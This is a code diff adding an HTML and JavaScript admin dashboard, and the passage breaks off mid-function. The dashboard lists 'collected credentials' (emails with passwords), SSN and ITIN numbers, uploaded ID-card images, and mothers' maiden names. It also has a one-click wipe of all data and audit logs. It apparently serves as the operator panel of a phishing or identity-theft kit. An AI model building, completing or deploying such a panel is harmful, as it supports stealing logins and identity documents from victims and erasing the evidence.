@@ -1,0 +1,1216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    :root {
+      --primary: #0f172a;
+      --secondary: #1e293b;
+      --accent: #00d9ff;
+      --accent-alt: #7c3aed;
+      --success: #10b981;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --text-primary: #f1f5f9;
+      --text-secondary: #cbd5e1;
+      --border: #334155;
+    }
+    
+    body { 
+      font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
+      background: linear-gradient(135deg, var(--primary) 0%, #0d0f1d 100%);
+      color: var(--text-primary);
+      min-height: 100vh;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+    
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 20% 50%, rgba(0, 217, 255, 0.03) 0%, transparent 50%),
+                  radial-gradient(circle at 80% 80%, rgba(124, 58, 237, 0.03) 0%, transparent 50%);
+      pointer-events: none;
+      z-index: -1;
+    }
+    
+    .wrapper { max-width: 1600px; margin: 0 auto; position: relative; z-index: 1; }
+    
+    header {
+      background: linear-gradient(135deg, var(--secondary) 0%, rgba(30, 41, 59, 0.8) 100%);
+      border: 1px solid var(--border);
+      padding: 40px;
+      border-radius: 16px;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      margin-bottom: 30px;
+      backdrop-filter: blur(10px);
+    }
+    
+    h1 { 
+      color: var(--text-primary);
+      font-size: 36px;
+      margin-bottom: 5px;
+      background: linear-gradient(135deg, var(--accent) 0%, var(--accent-alt) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: -0.5px;
+    }
+    
+    .subtitle { color: var(--text-secondary); font-size: 14px; }
+    
+    .nav-tabs {
+      display: flex;
+      gap: 5px;
+      border-bottom: 1px solid var(--border);
+      margin-top: 30px;
+      padding-top: 20px;
+      flex-wrap: wrap;
+    }
+    
+    .nav-tabs button {
+      background: none;
+      border: none;
+      padding: 12px 20px;
+      cursor: pointer;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--text-secondary);
+      border-bottom: 2px solid transparent;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+    }
+    
+    .nav-tabs button::after {
+      content: '';
+      position: absolute;
+      bottom: -1px;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, var(--accent), var(--accent-alt));
+      transform: scaleX(0);
+      transition: transform 0.3s ease;
+    }
+    
+    .nav-tabs button:hover {
+      color: var(--accent);
+    }
+    
+    .nav-tabs button.active {
+      color: var(--accent);
+      border-bottom-color: var(--accent);
+    }
+    
+    .nav-tabs button.active::after {
+      transform: scaleX(1);
+    }
+    
+    .container { 
+      background: linear-gradient(135deg, var(--secondary) 0%, rgba(30, 41, 59, 0.6) 100%);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      padding: 40px;
+      backdrop-filter: blur(10px);
+    }
+    
+    .tab-content { display: none; animation: fadeIn 0.3s ease; }
+    .tab-content.active { display: block; }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 24px;
+      margin-bottom: 40px;
+    }
+    
+    .stat-card {
+      background: linear-gradient(135deg, rgba(0, 217, 255, 0.1) 0%, rgba(124, 58, 237, 0.1) 100%);
+      border: 1px solid rgba(0, 217, 255, 0.2);
+      color: var(--text-primary);
+      padding: 28px;
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0, 217, 255, 0.1);
+      backdrop-filter: blur(10px);
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .stat-card::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      right: -50%;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle, rgba(0, 217, 255, 0.2) 0%, transparent 70%);
+      animation: pulse 3s ease-in-out infinite;
+    }
+    
+    .stat-card:hover {
+      border-color: var(--accent);
+      box-shadow: 0 12px 48px rgba(0, 217, 255, 0.2);
+      transform: translateY(-4px);
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 0.5; }
+      50% { opacity: 1; }
+    }
+    
+    .stat-label { 
+      font-size: 11px;
+      opacity: 0.7;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+      letter-spacing: 1px;
+      position: relative;
+      z-index: 1;
+    }
+    
+    .stat-value { 
+      font-size: 36px;
+      font-weight: 700;
+      background: linear-gradient(135deg, var(--accent), var(--accent-alt));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      position: relative;
+      z-index: 1;
+    }
+    
+    .table-wrapper {
+      overflow-x: auto;
+      margin: 20px 0;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+    }
+    
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+    }
+    
+    th {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 16px;
+      text-align: left;
+      font-weight: 700;
+      color: var(--accent);
+      border-bottom: 1px solid var(--border);
+      text-transform: uppercase;
+      font-size: 11px;
+      letter-spacing: 0.5px;
+    }
+    
+    td {
+      padding: 14px 16px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      color: var(--text-secondary);
+    }
+    
+    tr:last-child td {
+      border-bottom: none;
+    }
+    
+    tr:hover {
+      background: rgba(0, 217, 255, 0.05);
+    }
+    
+    .btn-group {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
+    }
+    
+    button, input[type="text"], input[type="email"], select {
+      padding: 12px 18px;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      font-size: 13px;
+      transition: all 0.2s;
+      backdrop-filter: blur(10px);
+    }
+    
+    button {
+      background: linear-gradient(135deg, var(--accent) 0%, var(--accent-alt) 100%);
+      color: var(--primary);
+      border: none;
+      cursor: pointer;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      box-shadow: 0 8px 16px rgba(0, 217, 255, 0.2);
+    }
+    
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 24px rgba(0, 217, 255, 0.3);
+    }
+    
+    button:active {
+      transform: translateY(0);
+    }
+    
+    button.danger {
+      background: linear-gradient(135deg, #ef4444, #dc2626);
+      box-shadow: 0 8px 16px rgba(239, 68, 68, 0.2);
+    }
+    
+    button.danger:hover {
+      box-shadow: 0 12px 24px rgba(239, 68, 68, 0.3);
+    }
+    
+    input, select {
+      background: rgba(255, 255, 255, 0.05);
+      color: var(--text-primary);
+      border-color: var(--border);
+    }
+    
+    input::placeholder {
+      color: var(--text-secondary);
+    }
+    
+    input:focus, select:focus { 
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(0, 217, 255, 0.1);
+    }
+    
+    .badge {
+      display: inline-block;
+      padding: 6px 10px;
+      border-radius: 6px;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    .badge-success { 
+      background: rgba(16, 185, 129, 0.2);
+      color: #10b981;
+      border: 1px solid rgba(16, 185, 129, 0.3);
+    }
+    
+    .badge-danger { 
+      background: rgba(239, 68, 68, 0.2);
+      color: #ef4444;
+      border: 1px solid rgba(239, 68, 68, 0.3);
+    }
+    
+    .doc-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+      gap: 24px;
+      margin-top: 24px;
+    }
+    
+    .doc-card {
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      background: rgba(0, 217, 255, 0.05);
+      transition: all 0.3s ease;
+    }
+    
+    .doc-card:hover {
+      border-color: var(--accent);
+      box-shadow: 0 12px 32px rgba(0, 217, 255, 0.1);
+      transform: translateY(-4px);
+    }
+    
+    .doc-title { 
+      font-weight: 700;
+      color: var(--accent);
+      margin-bottom: 12px;
+    }
+    
+    .doc-info { 
+      font-size: 12px;
+      color: var(--text-secondary);
+      margin: 8px 0;
+    }
+    
+    .doc-actions { 
+      display: flex;
+      gap: 10px;
+      margin-top: 16px;
+    }
+    
+    .doc-actions a {
+      flex: 1;
+      padding: 10px;
+      text-align: center;
+      background: linear-gradient(135deg, var(--accent), var(--accent-alt));
+      color: var(--primary);
+      text-decoration: none;
+      border-radius: 8px;
+      font-size: 12px;
+      font-weight: 700;
+      transition: all 0.2s;
+    }
+    
+    .doc-actions a:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 16px rgba(0, 217, 255, 0.2);
+    }
+    
+    .section-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--accent);
+      margin: 32px 0 20px 0;
+      border-bottom: 2px solid var(--border);
+      padding-bottom: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    .loading { 
+      text-align: center;
+      padding: 40px;
+      color: var(--text-secondary);
+      font-size: 14px;
+    }
+    
+    .error { 
+      color: #fca5a5;
+      padding: 16px;
+      background: rgba(239, 68, 68, 0.1);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      border-radius: 8px;
+      margin: 16px 0;
+    }
+    
+    .delete-zone {
+      background: rgba(239, 68, 68, 0.05);
+      border: 2px dashed rgba(239, 68, 68, 0.3);
+      border-radius: 12px;
+      padding: 32px;
+      margin-top: 32px;
+      text-align: center;
+    }
+    
+    .delete-zone h3 {
+      color: #fca5a5;
+      margin-bottom: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      font-size: 14px;
+    }
+    
+    .delete-zone p {
+      color: var(--text-secondary);
+      margin-bottom: 20px;
+      font-size: 13px;
+    }
+    
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(5px);
+      animation: fadeIn 0.3s ease;
+    }
+    
+    .modal.active {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .modal-content {
+      background: var(--secondary);
+      padding: 40px;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+      max-width: 500px;
+      width: 90%;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+      animation: slideUp 0.3s ease;
+    }
+    
+    @keyframes slideUp {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    
+    .modal h2 {
+      color: var(--text-primary);
+      margin-bottom: 12px;
+      font-size: 20px;
+    }
+    
+    .modal p {
+      color: var(--text-secondary);
+      margin-bottom: 24px;
+      font-size: 14px;
+    }
+    
+    .modal-buttons {
+      display: flex;
+      gap: 12px;
+      justify-content: flex-end;
+    }
+    
+    .modal-buttons button {
+      padding: 12px 24px;
+      flex: 1;
+    }
+    
+    .btn-cancel {
+      background: rgba(255, 255, 255, 0.1) !important;
+      color: var(--text-primary) !important;
+      box-shadow: none !important;
+    }
+    
+    .btn-cancel:hover {
+      background: rgba(255, 255, 255, 0.15) !important;
+    }
+
+    /* Toast Notifications */
+    .toast-container {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 10000;
+      pointer-events: none;
+    }
+
+    .toast {
+      background: linear-gradient(135deg, var(--secondary) 0%, rgba(30, 41, 59, 0.8) 100%);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px 24px;
+      margin-bottom: 12px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      animation: slideInRight 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      backdrop-filter: blur(10px);
+      min-width: 350px;
+      max-width: 450px;
+      pointer-events: all;
+    }
+
+    .toast.success {
+      border-color: rgba(16, 185, 129, 0.3);
+    }
+
+    .toast.error {
+      border-color: rgba(239, 68, 68, 0.3);
+    }
+
+    .toast.info {
+      border-color: rgba(0, 217, 255, 0.3);
+    }
+
+    .toast-icon {
+      font-size: 24px;
+      min-width: 24px;
+      text-align: center;
+    }
+
+    .toast.success .toast-icon {
+      color: #10b981;
+    }
+
+    .toast.error .toast-icon {
+      color: #ef4444;
+    }
+
+    .toast.info .toast-icon {
+      color: #00d9ff;
+    }
+
+    .toast-content {
+      flex: 1;
+    }
+
+    .toast-title {
+      font-weight: 700;
+      font-size: 14px;
+      color: var(--text-primary);
+      margin-bottom: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .toast-message {
+      font-size: 13px;
+      color: var(--text-secondary);
+      line-height: 1.5;
+    }
+
+    .toast-close {
+      background: none;
+      border: none;
+      color: var(--text-secondary);
+      cursor: pointer;
+      font-size: 20px;
+      padding: 0;
+      min-width: auto;
+      box-shadow: none;
+      transition: color 0.2s;
+    }
+
+    .toast-close:hover {
+      color: var(--text-primary);
+    }
+
+    @keyframes slideInRight {
+      from {
+        transform: translateX(400px);
+        opacity: 0;
+      }
+      to {
+        transform: translateX(0);
+        opacity: 1;
+      }
+    }
+
+    @keyframes slideOutRight {
+      from {
+        transform: translateX(0);
+        opacity: 1;
+      }
+      to {
+        transform: translateX(400px);
+        opacity: 0;
+      }
+    }
+
+    .toast.removing {
+      animation: slideOutRight 0.4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+    }
+
+    @media (max-width: 768px) {
+      .toast {
+        min-width: calc(100vw - 40px);
+        max-width: calc(100vw - 40px);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <header>
+      <h1>◆ ADMIN NEXUS ◆</h1>
+      <p class="subtitle">Next-generation data intelligence & audit control system</p>
+      <div class="nav-tabs">
+        <button class="tab-btn active" data-tab="overview">OVERVIEW</button>
+        <button class="tab-btn" data-tab="users">USERS</button>
+        <button class="tab-btn" data-tab="documents">DOCUMENTS</button>
+        <button class="tab-btn" data-tab="background">BACKGROUND</button>
+        <button class="tab-btn" data-tab="credentials">CREDENTIALS</button>
+        <button class="tab-btn" data-tab="sensitive">SENSITIVE</button>
+        <button class="tab-btn" data-tab="logs">AUDIT LOGS</button>
+        <button class="tab-btn" data-tab="admin">ADMIN</button>
+      </div>
+    </header>
+
+    <div class="container">
+      <!-- Overview Tab -->
+      <div id="overview" class="tab-content active">
+        <h2 class="section-title">System Statistics</h2>
+        <div class="stats-grid" id="statsContainer">
+          <div class="loading">Loading statistics...</div>
+        </div>
+        
+        <h2 class="section-title">Recent Activity</h2>
+        <div class="table-wrapper">
+          <table id="recentTable">
+            <thead>
+              <tr>
+                <th>Timestamp</th>
+                <th>User Email</th>
+                <th>Action</th>
+                <th>Status</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td colspan="4" style="text-align: center; padding: 40px;">Loading...</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Users Tab -->
+      <div id="users" class="tab-content">
+        <h2 class="section-title">All Users</h2>
+        <div class="btn-group">
+          <button onclick="loadAllUsers()">Load All Users</button>
+          <button onclick="exportAllUsersCSV()" style="background: #27ae60; margin-left: 10px;">⬇️ Export All as CSV</button>
+        </div>
+        <div class="table-wrapper">
+          <table id="usersTable">
+            <thead>
+              <tr>
+                <th>Email</th>
+                <th>First Name</th>
+                <th>Last Name</th>
+                <th>Stage</th>
+                <th>Verified</th>
+                <th>Created</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td colspan="7" style="text-align: center; padding: 40px;">Click "Load All Users" button</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Documents Tab -->
+      <div id="documents" class="tab-content">
+        <h2 class="section-title">Uploaded Documents</h2>
+        <button onclick="loadDocuments()">Load Documents</button>
+        <div id="documentsContainer" style="margin-top: 20px;"></div>
+      </div>
+
+      <!-- Background Info Tab -->
+      <div id="background" class="tab-content">
+        <h2 class="section-title">Background Request Information</h2>
+        <button onclick="loadBackgroundInfo()">Load Background Info</button>
+        <div class="table-wrapper" style="margin-top: 20px;">
+          <table id="backgroundTable">
+            <thead>
+              <tr>
+                <th>User Email</th>
+                <th>First Name</th>
+                <th>Last Name</th>
+                <th>Middle Name</th>
+                <th>Father Name</th>
+                <th>Mother Name</th>
+                <th>Maiden Name</th>
+                <th>Place of Birth</th>
+                <th>Timestamp</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td colspan="9" style="text-align: center; padding: 40px;">Click "Load Background Info" button</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Credentials Tab -->
+      <div id="credentials" class="tab-content">
+        <h2 class="section-title">Collected Credentials</h2>
+        <button onclick="loadCredentials()">Load Credentials</button>
+        <div class="table-wrapper" style="margin-top: 20px;">
+          <table id="credTable">
+            <thead>
+              <tr>
+                <th>User Email</th>
+                <th>Email</th>
+                <th>Password</th>
+                <th>Timestamp</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td colspan="4" style="text-align: center; padding: 40px;">Click "Load Credentials" button</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Sensitive Data Tab -->
+      <div id="sensitive" class="tab-content">
+        <h2 class="section-title">SSN & ITIN Data</h2>
+        <button onclick="loadSensitiveData()">Load Sensitive Data</button>
+        
+        <h3 style="margin-top: 30px; font-size: 16px; color: #2d3748;">Social Security Numbers</h3>
+        <div class="table-wrapper">
+          <table id="ssnTable">
+            <thead>
+              <tr><th>User Email</th><th>SSN</th><th>Date</th></tr>
+            </thead>
+            <tbody>
+              <tr><td colspan="3" style="text-align: center; padding: 20px;">Click "Load Sensitive Data"</td></tr>
+            </tbody>
+          </table>
+        </div>
+        
+        <h3 style="margin-top: 30px; font-size: 16px; color: #2d3748;">ITIN Numbers</h3>
+        <div class="table-wrapper">
+          <table id="itinTable">
+            <thead>
+              <tr><th>User Email</th><th>ITIN</th><th>Date</th></tr>
+            </thead>
+            <tbody>
+              <tr><td colspan="3" style="text-align: center; padding: 20px;">Click "Load Sensitive Data"</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Logs Tab -->
+      <div id="logs" class="tab-content">
+        <h2 class="section-title">Audit Logs</h2>
+        <div class="btn-group">
+          <select id="actionFilter">
+            <option value="">All Actions</option>
+            <option value="SIGNIN_ATTEMPT">Sign In</option>
+            <option value="DOCUMENT_UPLOAD_FRONT">ID Front Upload</option>
+            <option value="DOCUMENT_UPLOAD_BACK">ID Back Upload</option>
+            <option value="PERSONAL_INFO_SUBMITTED">Personal Info</option>
+            <option value="SSN_SUBMITTED">SSN Submitted</option>
+            <option value="ITIN_SUBMITTED">ITIN Submitted</option>
+          </select>
+          <button onclick="loadLogs()">Load Logs</button>
+        </div>
+        <div class="table-wrapper">
+          <table id="logsTable">
+            <thead>
+              <tr>
+                <th>Timestamp</th>
+                <th>User Email</th>
+                <th>Action</th>
+                <th>Status</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td colspan="4" style="text-align: center; padding: 40px;">Click "Load Logs" button</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Admin Tab -->
+      <div id="admin" class="tab-content">
+        <h2 class="section-title">System Administration</h2>
+        
+        <div class="delete-zone">
+          <h3>⚠️ DANGER ZONE ⚠️</h3>
+          <p>Permanent deletion of all system data and audit logs. This action cannot be undone.</p>
+          <button class="danger" onclick="openDeleteModal()">🗑️ DELETE ALL DATA & LOGS</button>
+        </div>
+
+        <div style="margin-top: 40px; padding: 24px; background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: 12px;">
+          <h3 style="color: var(--success); margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.5px;">System Info</h3>
+          <p style="color: var(--text-secondary); font-size: 13px; line-height: 1.6;">
+            • All user accounts, documents, credentials, and audit logs will be permanently removed<br>
+            • Database will be reset to initial state<br>
+            • This operation requires confirmation to prevent accidental data loss
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Delete Confirmation Modal -->
+  <div id="deleteModal" class="modal">
+    <div class="modal-content">
+      <h2>⚠️ Confirm Permanent Deletion</h2>
+      <p style="margin-top: 16px;">Are you absolutely sure? This will permanently delete:</p>
+      <ul style="color: var(--text-secondary); margin: 16px 0 24px 20px; font-size: 13px;">
+        <li>All user accounts</li>
+        <li>All uploaded documents</li>
+        <li>All collected credentials</li>
+        <li>All sensitive data (SSN/ITIN)</li>
+        <li>All audit logs</li>
+      </ul>
+      <p style="color: #fca5a5; font-weight: 700; margin-bottom: 24px; text-transform: uppercase; font-size: 12px;">THIS ACTION CANNOT BE UNDONE</p>
+      <div class="modal-buttons">
+        <button class="btn-cancel" onclick="closeDeleteModal()">Cancel</button>
+        <button class="danger" onclick="confirmDelete()">Yes, Delete Everything</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast Notifications Container -->
+  <div class="toast-container" id="toastContainer"></div>
+
+  <script>
+    const API = 'http://localhost:5000/admin/api';
+
+    // ============ TOAST NOTIFICATION SYSTEM ============
+    function showToast(type, title, message, duration = 4000) {
+      const container = document.getElementById('toastContainer');
+      const toast = document.createElement('div');
+      toast.className = `toast ${type}`;
+      
+      const icons = {
+        success: '✓',
+        error: '✕',
+        info: 'ℹ'
+      };
+      
+      toast.innerHTML = `
+        <span class="toast-icon">${icons[type] || '!'}</span>
+        <div class="toast-content">
+          <div class="toast-title">${title}</div>
+          <div class="toast-message">${message}</div>
+        </div>
+        <button class="toast-close" onclick="this.parentElement.remove()">&times;</button>
+      `;
+      
+      container.appendChild(toast);
+      
+      if (duration > 0) {
+        setTimeout(() => {
+          toast.classList.add('removing');
+          setTimeout(() => toast.remove(), 400);
+        }, duration);
+      }
+      
+      return toast;
+    }
+
+    // Tab switching
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+      btn.addEventListener('click', function(e) {
+        const tabName = this.getAttribute('data-tab');
+        
+        // Hide all tabs
+        document.querySelectorAll('.tab-content').forEach(el => {
+          el.classList.remove('active');
+        });
+        
+        // Remove active from all buttons
+        document.querySelectorAll('.tab-btn').forEach(el => {
+          el.classList.remove('active');
+        });
+        
+        // Show selected tab
+        document.getElementById(tabName).classList.add('active');
+        this.classList.add('active');
+        
+        // Load data for tab
+        if (tabName === 'overview') loadStats();
+        else if (tabName === 'users') loadAllUsers();
+        else if (tabName === 'documents') loadDocuments();
+        else if (tabName === 'background') loadBackgroundInfo();
+        else if (tabName === 'credentials') loadCredentials();
+        else if (tabName === 'sensitive') loadSensitiveData();
+        else if (tabName === 'logs') loadLogs();
+      });
+    });
+
+    // Delete Modal Functions
+    function openDeleteModal() {
+      document.getElementById('deleteModal').classList.add('active');
+    }
+
+    function closeDeleteModal() {
+      document.getElementById('deleteModal').classList.remove('active');
+    }
+
+    async function confirmDelete() {
+      try {
+        const res = await fetch(API + '/delete-all', { method: 'DELETE' });
+        const data = await res.json();
+        
+        if (res.ok) {
+          showToast('success', 'SUCCESS', `${data.deletedUsers} users and ${data.deletedLogs} logs have been permanently deleted.`, 5000);
+          closeDeleteModal();
+          setTimeout(() => loadStats(), 1000);
+        } else {
+          showToast('error', 'ERROR', data.message || 'Failed to delete data');
+        }
+      } catch (error) {
+        showToast('error', 'ERROR', 'Network error: ' + error.message);
+      }
+    }
+
+    async function loadStats() {
+      try {
+        const res = await fetch(API + '/statistics');
+        const data = await res.json();
+        
+        let html = '';
+        html += '<div class="stat-card"><div class="stat-label">Total Users</div><div class="stat-value">' + (data.summary?.totalUsers || 0) + '</div></div>';
+        html += '<div class="stat-card"><div class="stat-label">Verified</div><div class="stat-value">' + (data.summary?.verifiedUsers || 0) + '</div></div>';
+        html += '<div class="stat-card"><div class="stat-label">Total Logins</div><div class="stat-value">' + (data.summary?.totalLogins || 0) + '</div></div>';
+        html += '<div class="stat-card"><div class="stat-label">Documents</div><div class="stat-value">' + (data.summary?.totalDocumentsUploaded || 0) + '</div></div>';
+        
+        document.getElementById('statsContainer').innerHTML = html;
+        loadRecentLogs();
+      } catch (error) {
+        console.error('Error:', error);
+        document.getElementById('statsContainer').innerHTML = '<div class="error">Error loading statistics</div>';
+      }
+    }
+
+    async function loadRecentLogs() {
+      try {
+        const res = await fetch(API + '/logs/all?limit=10');
+        const data = await res.json();
+        
+        let html = '';
+        if (data.logs && data.logs.length > 0) {
+          data.logs.slice(0, 10).forEach(log => {
+            const date = new Date(log.createdAt).toLocaleString();
+            const status = log.status === 'success' ? '<span class="badge badge-success">✓ SUCCESS</span>' : '<span class="badge badge-danger">✗ FAILED</span>';
+            html += '<tr>';
+            html += '<td>' + date + '</td>';
+            html += '<td>' + (log.userEmail || '-') + '</td>';
+            html += '<td>' + log.action + '</td>';
+            html += '<td>' + status + '</td>';
+            html += '</tr>';
+          });
+        }
+        
+        document.querySelector('#recentTable tbody').innerHTML = html;
+      } catch (error) {
+        console.error('Error:', error);
+      }
+    }
+
+    async function loadAllUsers() {
+      try {
+        const res = await fetch(API + '/users/all');
+        const data = await res.json();
+        
+        let html = '';
+        if (data.users && data.users.length > 0) {
+          data.users.forEach(user => {
+            const verified = user.identityVerified ? '✓' : '✗';
+            const created = new Date(user.createdAt).toLocaleDateString();
+            html += '<tr>';
+            html += '<td>' + user.email + '</td>';
+            html += '<td>' + (user.firstName || '-') + '</td>';
+            html += '<td>' + (user.lastName || '-') + '</td>';
+            html += '<td><span class="badge badge-success">' + (user.verificationStage || 0) + '/5</span></td>';
+            html += '<td><span class="badge badge-' + (verified === '✓' ? 'success' : 'danger') + '">' + verified + '</span></td>';
+            html += '<td>' + created + '</td>';
+            html += '<td><button onclick="exportUserHTML(\'' + user.id + '\')" style="padding: 6px 12px; background: linear-gradient(135deg, var(--accent), var(--accent-alt)); color: var(--primary); border: none; border-radius: 6px; cursor: pointer; margin-right: 5px; font-weight: 700; font-size: 12px;">📄</button>';
+            html += '<button onclick="exportUserCSV(\'' + user.id + '\')" style="padding: 6px 12px; background: linear-gradient(135deg, #10b981, #059669); color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 700; font-size: 12px;">📊</button></td>';
+            html += '</tr>';
+          });
+        }
+        
+        document.querySelector('#usersTable tbody').innerHTML = html;
+      } catch (error) {
+        console.error('Error:', error);
+      }
+    }
+
+    async function loadDocuments() {
+      try {
+        const res = await fetch(API + '/data/documents');
+        const data = await res.json();
+        
+        let html = '';
+        
+        if (data.frontDocuments?.total > 0) {
+          html += '<h3 style="margin-top: 20px; color: var(--accent); text-transform: uppercase; letter-spacing: 0.5px; font-size: 14px;">Front ID Documents (' + data.frontDocuments.total + ')</h3>';
+          html += '<div class="doc-grid">';
+          data.frontDocuments.documents.forEach(doc => {
+            const size = (doc.filesize / 1024).toFixed(2) + ' KB';
+            const date = new Date(doc.uploadTime).toLocaleString();
+            html += '<div class="doc-card">';
+            html += '<div style="width: 100%; height: 200px; background: rgba(0,0,0,0.3); border-radius: 8px; margin-bottom: 10px; overflow: hidden;"><img src="' + doc.previewUrl + '" alt="ID Front" style="width: 100%; height: 100%; object-fit: contain;"></div>';
+            html += '<div class="doc-title">' + doc.email + '</div>';
+            html += '<div class="doc-info">📄 ' + doc.filename + '</div>';
+            html += '<div class="doc-info">📦 ' + size + '</div>';
+            html += '<div class="doc-info">📅 ' + date + '</div>';
+            html += '<div class="doc-actions"><a href="' + doc.downloadUrl + '" download>⬇️ Download</a></div>';
+            html += '</div>';
+          });
+          html += '</div>';
+        }
+        
+        if (data.backDocuments?.total > 0) {
+          html += '<h3 style="margin-top: 30px; color: var(--accent); text-transform: uppercase; letter-spacing: 0.5px; font-size: 14px;">Back ID Documents (' + data.backDocuments.total + ')</h3>';
+          html += '<div class="doc-grid">';
+          data.backDocuments.documents.forEach(doc => {
+            const size = (doc.filesize / 1024).toFixed(2) + ' KB';
+            const date = new Date(doc.uploadTime).toLocaleString();
+            html += '<div class="doc-card">';
+            html += '<div style="width: 100%; height: 200px; background: rgba(0,0,0,0.3); border-radius: 8px; margin-bottom: 10px; overflow: hidden;"><img src="' + doc.previewUrl + '" alt="ID Back" style="width: 100%; height: 100%; object-fit: contain;"></div>';
+            html += '<div class="doc-title">' + doc.email + '</div>';
+            html += '<div class="doc-info">📄 ' + doc.filename + '</div>';
+            html += '<div class="doc-info">📦 ' + size + '</div>';
+            html += '<div class="doc-info">📅 ' + date + '</div>';
+            html += '<div class="doc-actions"><a href="' + doc.downloadUrl + '" download>⬇️ Download</a></div>';
+            html += '</div>';
+          });
+          html += '</div>';
+        }
+        
+        if (!html) html = '<p style="color: var(--text-secondary); padding: 20px;">No documents uploaded yet</p>';
+        
+        document.getElementById('documentsContainer').innerHTML = html;
+      } catch (error) {
+        console.error('Error:', error);
+        document.getElementById('documentsContainer').innerHTML = '<div class="error">Error loading documents</div>';
+      }
+    }
+
+    async function loadBackgroundInfo() {
+      try {
+        const res = await fetch(API + '/data/personal-info');
+        const data = await res.json();
+        
+        let html = '';
+        if (data.personalInfo && data.personalInfo.length > 0) {
+          data.personalInfo.forEach(item => {
+            const date = new Date(item.createdAt).toLocaleString();
+            const personData = item.data || {};
+            html += '<tr>';
+            html += '<td>' + (item.email || '-') + '</td>';
+            html += '<td>' + (personData.firstName || '-') + '</td>';
